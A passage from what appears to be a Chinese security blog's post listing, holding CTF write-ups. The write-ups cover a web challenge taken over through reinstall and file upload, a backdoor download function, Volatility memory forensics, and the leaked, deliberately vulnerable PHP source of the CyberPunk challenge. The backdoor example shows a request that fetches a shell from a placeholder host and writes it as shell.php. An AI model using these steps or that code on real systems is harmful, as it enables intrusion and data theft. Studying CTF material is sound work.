+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>804</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="粤湾期货"><a href="#粤湾期货" class="headerlink" title="粤湾期货"></a>粤湾期货</h2><ul>
+<li>首先直奔<code>install.php</code>发现源码中并没有做出重装限制，并且在<code>config.php</code>可以知道数据库和账号密码直接重装系统拿下后台。</li>
+<li>拿下后台发现系统设置处可以修改上传文件类型。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745165921699.png" alt="img"></p>
+<ul>
+<li>但是加入php后缀你发现会将phpt替换为X,从源码中可有很直观看到这点。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745169665422.png" alt="img"></p>
+<ul>
+<li>此时毫无头绪，代码审计数量太大，所以黑盒测试一下，发现数据备份处可以执行sql语句。本以为可以直接写文件，但是失败了，联想到上面上传文件后缀我们可以直接在备份文件里面修改后缀是PHP，最后直接getshell即可。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745175748287.png" alt="img"></p>
+<ul>
+<li>导入备份后发现设置中的上传后缀有php</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745180341751.png" alt="img"></p>
+<ul>
+<li>直接上传php文件直接getshell</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745181028456.png" alt="img"></p>
+<h2 id="粤湾基金"><a href="#粤湾基金" class="headerlink" title="粤湾基金"></a>粤湾基金</h2><p>/index.php/home/test存在一处后门直接可getflag</p>
+<pre><code>// /Home/Test/dlfile?file_url=http://xxxx/shell.txt&amp;save_to=/var/www/html/shell.php
+///Home/Test/dlfile?file_url=file:///flag&amp;save_to=/var/www/html/1.txt
+    // 下载图片
+public function dlfile($file_url, $save_to)
+{
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_POST, 0); 
+        curl_setopt($ch,CURLOPT_URL,$file_url); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+        $file_content = curl_exec($ch);
+        curl_close($ch);
+        $downloaded_file = fopen($save_to, &#39;w&#39;);
+        fwrite($downloaded_file, $file_content);
+        fclose($downloaded_file);
+}</code></pre>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d7cc8e3b98.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d7cc8e3b98.html" class="post-title-link" itemprop="url">Volatility内存取证学习-复盘红帽杯Advertising for Marriage</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-14 22:17:16" itemprop="dateCreated datePublished" datetime="2019-11-14T22:17:16+08:00">2019-11-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:17:06" itemprop="dateModified" datetime="2020-10-14T17:17:06+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>458</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="获取镜像信息"><a href="#获取镜像信息" class="headerlink" title="获取镜像信息"></a>获取镜像信息</h1><pre><code class="shell">volatility -f &lt;file&gt; imageinfo</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738160914043.png" alt="img"></p>
+<h1 id="读取进程"><a href="#读取进程" class="headerlink" title="读取进程"></a>读取进程</h1><pre><code class="shell">volatility -f &lt;file&gt; --profile=WinXPSP2x86 psscan</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738161931286.png" alt="img"></p>
+<h1 id="读取指定进程内容"><a href="#读取指定进程内容" class="headerlink" title="读取指定进程内容"></a>读取指定进程内容</h1><pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86 memdump -p 332 --dump-dir=./</code></pre>
+<pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86 notepad</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738164635401.png" alt="img"></p>
+<ul>
+<li><p>提取出来的文件用gimp打开调整宽度直至出现图像</p>
+</li>
+<li><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738341787357.png" alt="img"></p>
+</li>
+<li><p>综合得到提示</p>
+<pre><code>b1cxneedmoneyandgirlfirend</code></pre></li>
+</ul>
+<h1 id="搜索图片"><a href="#搜索图片" class="headerlink" title="搜索图片"></a>搜索图片</h1><pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86  filescan | grep -E &#39;jpg|png|jpeg|bmp|gif&#39;</code></pre>
+<h1 id="提取图片"><a href="#提取图片" class="headerlink" title="提取图片"></a>提取图片</h1><pre><code>volatility -f 1.raw --profile=WinXPSP2x86 dumpfiles -Q 0x000000000249ae78  -n --dump-dir=./</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738343277555.png" alt="img"></p>
+<h1 id="lsb解码、base64、维吉尼亚密码"><a href="#lsb解码、base64、维吉尼亚密码" class="headerlink" title="lsb解码、base64、维吉尼亚密码"></a>lsb解码、base64、维吉尼亚密码</h1><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738780599940.jpg" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738780779999.jpg" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d711660d49.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d711660d49.html" class="post-title-link" itemprop="url">复现CISCN2019 华北赛区 Day1 Web5]CyberPunk</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-02 22:28:47" itemprop="dateCreated datePublished" datetime="2019-11-02T22:28:47+08:00">2019-11-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:17:31" itemprop="dateModified" datetime="2020-10-14T17:17:31+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>16k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>15 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li><p>查看源码给了提示目测是文件包含</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/1573214441440.png" alt="img"></p>
+</li>
+<li><p>PHP伪协议直接读取源码</p>
+<p><img src="C:%5CUsers%5C51763%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191108200230449.png" alt="image-20191108200230449"></p>
+</li>
+<li><p>源码如下：</p>
+<ul>
+<li>index.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);
+
+// $file = $_GET[&quot;file&quot;];
+$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);
+if (isset($file)){
+    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {
+        echo(&#39;no way!&#39;);
+        exit;
+    }
+    @include($file);
+}
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;index&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+&lt;meta charset=&quot;utf-8&quot; /&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h2&gt;2077鍙戝敭浜�,涓嶆潵浠藉疄浣撳吀钘忕増鍚�?&lt;/h2&gt;
+        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;h3&gt;鎻愪氦璁㈠崟&lt;/h3&gt;
+                &lt;form role=&quot;form&quot; action=&quot;./confirm.php&quot; method=&quot;post&quot; enctype=&quot;application/x-www-urlencoded&quot;&gt;
+                    &lt;p&gt;
+                    &lt;h3&gt;濮撳悕:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
+                    &lt;h3&gt;鐢佃瘽:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
+                    &lt;h3&gt;鍦板潃:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
+                    &lt;/p&gt;
+                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;鎴戞鏄�侀挶涔嬩汉&lt;/button&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;璁㈠崟绠＄悊&lt;/h2&gt;
+            &lt;a href=&quot;./search.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;鎴戣鏌ヨ鍗�&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./change.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;鎴戣淇敼鏀惰揣鍦板潃&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./delete.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;鎴戜笉鎯宠浜�&lt;/button&gt;
+            &lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!--?file=?--&gt;</code></pre>
+<ul>
+<li>confirm.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+require_once &quot;config.php&quot;;
+//var_dump($_POST);
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $address = $_POST[&quot;address&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = &#39;no sql inject!&#39;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if($fetch-&gt;num_rows&gt;0) {
+        $msg = $user_name.&quot;已提交订单&quot;;
+    }else{
+        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;
+        $re = $db-&gt;prepare($sql);
+        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);
+        $re = $re-&gt;execute();
+        if(!$re) {
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;订单提交成功&quot;;
+    }
+} else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;确认订单&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+&lt;meta charset=&quot;utf-8&quot;/&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-zh.png&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
+                &lt;a href=&quot;./index.php&quot;&gt;
+                &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
+                &lt;/a&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
+            &lt;a href=&quot;./search.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./change.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./delete.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
+            &lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<ul>
+<li>search.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+require_once &quot;config.php&quot;; 
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
+        $msg = &#39;no sql inject!&#39;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
+        $row = $fetch-&gt;fetch_assoc();
+        if(!$row) {
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;
+    } else {
+        $msg = &quot;未找到订单!&quot;;
+    }
+}else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;搜索&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+                &lt;h1&gt;订单查询&lt;/h1&gt;
+                &lt;form method=&quot;post&quot;&gt;
+                    &lt;p&gt;
+                    &lt;h3&gt;姓名:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
+                    &lt;h3&gt;电话:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
+                    &lt;/p&gt;
+                    &lt;p&gt;
+                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;查询订单&lt;/button&gt;
+                    &lt;/p&gt;
+                &lt;/form&gt;
+                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
+            &lt;a href=&quot;./index.php&quot;&gt;
+                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;</code></pre>
+<ul>
+<li>change.php</li>
+</ul>
+<pre><code class="PHP">&lt;?php
+
+require_once &quot;config.php&quot;;
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $address = addslashes($_POST[&quot;address&quot;]);
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = &#39;no sql inject!&#39;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
+        $row = $fetch-&gt;fetch_assoc();
+        $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];
+        $result = $db-&gt;query($sql);
+        if(!$result) {
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;订单修改成功&quot;;
+    } else {
+        $msg = &quot;未找到订单!&quot;;
+    }
+}else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;修改收货地址&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+                &lt;h1&gt;修改收货地址&lt;/h1&gt;
+                &lt;form method=&quot;post&quot;&gt;
+                    &lt;p&gt;
+                    &lt;h3&gt;姓名:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
+                    &lt;h3&gt;电话:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
+                    &lt;h3&gt;地址:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
+                    &lt;/p&gt;
+                    &lt;p&gt;
+                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;修改订单&lt;/button&gt;
+                    &lt;/p&gt;
+                &lt;/form&gt;
+                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
+            &lt;a href=&quot;./index.php&quot;&gt;
+                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./search.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./delete.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
+            &lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>delete.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+require_once &quot;config.php&quot;;
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
+        $msg = &#39;no sql inject!&#39;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
+        $row = $fetch-&gt;fetch_assoc();
+        $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);
+        if(!$result) {
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;订单删除成功&quot;;
+    } else {
+        $msg = &quot;未找到订单!&quot;;
+    }
+}else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;删除订单&lt;/title&gt;
+&lt;base href=&quot;./&quot;&gt;
+&lt;meta charset=&quot;utf-8&quot; /&gt;
+
+&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;h&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
+                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+                &lt;h1&gt;删除订单&lt;/h1&gt;
+                &lt;form method=&quot;post&quot;&gt;
+                    &lt;p&gt;
+                    &lt;h3&gt;姓名:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
